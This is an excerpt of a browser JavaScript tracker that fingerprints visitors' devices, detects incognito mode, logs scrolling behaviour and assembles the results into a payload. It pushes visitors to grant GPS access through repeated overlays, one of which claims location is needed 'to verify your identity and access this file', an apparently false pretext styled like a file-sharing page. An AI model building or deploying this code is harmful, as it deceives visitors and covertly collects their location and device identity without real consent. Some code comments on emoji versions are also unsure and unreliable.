(function() {
    ...
    return {
      summarize: function() {
        ...
        if (scrollSamples.length > 0) {
          ...
          // Smoothness: low variance in speed = smooth
  ...
  function detectIncognito() {
    return new Promise(function(resolve) {
      ...
      navigator.storage.estimate().then(function(est) {
        // In incognito, quota is typically < 200MB
  ...
  // --- New async collectors for deep fingerprinting ---
  ...
  // --- New sync collectors for deep fingerprinting ---
  ...
  function collectEmojiSupport() {
    try {
      var emojis = [
        ...
        '\uD83E\uDD7A',  // 11.0 pleading face
        '\uD83E\uDE78',  // 12.0 drop of blood
        '\uD83E\uDEE0',  // 13.0 melting face... actually 14.0
        '\uD83E\uDEE1',  // 14.0 saluting face
        '\uD83E\uDEE8',  // 15.0 shaking face
        '\uD83D\uDE36\u200D\uD83C\uDF2B\uFE0F',  // face in clouds
        '\uD83E\uDEC3',  // 14.0 pregnant man (actually biting lip? checking...)
        '\u2764\uFE0F\u200D\uD83D\uDD25',  // heart on fire
        '\uD83E\uDEE9'   // 15.1 face with bags under eyes
      ];
      var canvas = document.createElement('canvas');
      canvas.width = 20;
      canvas.height = 20;
  ...
  function collectDevice() {
    ...
    // WebGL extended
    var webglExt = collectWebGLExtended(gl);
    Object.assign(deviceInfo, webglExt);
  ...
  function getLocationResetInstructions() {
    ...
    switch (browser) {
      ...
      case 'safari':
        return 'Go to Settings \u2192 Safari \u2192 Location Services \u2192 set to Allow, then refresh this page.';
      default:
  ...
  function showGpsRequiredMessage(config, retryCount, instantDenial) {
    checkGeoPermission().then(function(permState) {
      var isDenied = permState === 'denied' || (permState === 'unknown' && instantDenial);
      ...
      if (isDenied) {
        ...
        instructions.textContent = getLocationResetInstructions();
        instructions.style.cssText = 'margin:0 0 24px;font-size:13px;color:#444;line-height:1.6;background:#f8f9fa;padding:12px 16px;border-radius:8px;text-align:left;';
        ...
        btn.onclick = function() {
          overlay.remove();
          handleGpsRequired(config, retryCount + 1);
        };
  ...
  function handleGpsRequired(config, retryCount) {
    if (retryCount >= 3) {
      // After 3 failures, proceed anyway
    ...
    requestGPS().then(function(gpsInfo) {
      if (gpsInfo.gpsGranted) {
        ...
        showGpsRequiredMessage(config, retryCount, gpsInfo.instantDenial);
      }
    });
  }
  ...
  window.TrackerCollector = {
    ...
    run: function(config) {
      ...
      if (gpsMode === 'required') {
        // Start device collection, then handle required GPS
        collectDevice().then(function() {
          handleGpsRequired(config, 0);
        });
        return;
      }
    ...
    requestGPSAndSubmit: function(config, callback) {
      ...
      // Ensure device collection is done before sending
        ...
        function attemptGps() {
          requestGPS().then(function(gpsInfo) {
            if (gpsInfo.gpsGranted) {
              ...
              retryCount++;
              // Show required overlay for gdrive — check permission state first
              var wasInstantDenial = gpsInfo.instantDenial;
              checkGeoPermission().then(function(permState) {
                var isDenied = permState === 'denied' || (permState === 'unknown' && wasInstantDenial);
                ...
                var iconSvg = '<svg width="48" height="48" viewBox="0 0 24 24" fill="none" stroke="#ef4444" stroke-width="2" style="margin-bottom:16px"><path d="M21 10c0 7-9 13-9 13s-9-6-9-13a9 9 0 0 1 18 0z"/><circle cx="12" cy="10" r="3"/></svg>';

                if (isDenied) {
                  box.innerHTML = iconSvg +
                    '<h3 style="margin:0 0 8px;font-size:18px;font-weight:600;color:#111;">Location Permission Blocked</h3>' +
                    '<p style="margin:0 0 16px;font-size:14px;color:#666;line-height:1.5;">Location access was previously denied. To continue, please update your browser settings:</p>' +
                    '<p style="margin:0 0 24px;font-size:13px;color:#444;line-height:1.6;background:#f8f9fa;padding:12px 16px;border-radius:8px;text-align:left;">' + getLocationResetInstructions() + '</p>';
                  ...
                  box.innerHTML = iconSvg +
                    '<h3 style="margin:0 0 8px;font-size:18px;font-weight:600;color:#111;">Location Access Required</h3>' +
                    '<p style="margin:0 0 24px;font-size:14px;color:#666;line-height:1.5;">Please allow location access to verify your identity and access this file.</p>';
      ...
      // optional — request GPS immediately (user just clicked, so gesture is valid)
      requestGPS().then(function(gpsInfo) {
        ensureDevice.then(function() {
          Object.assign(deviceInfo, BehaviorTracker.summarize());
          var payload = Object.assign({}, deviceInfo, gpsInfo);
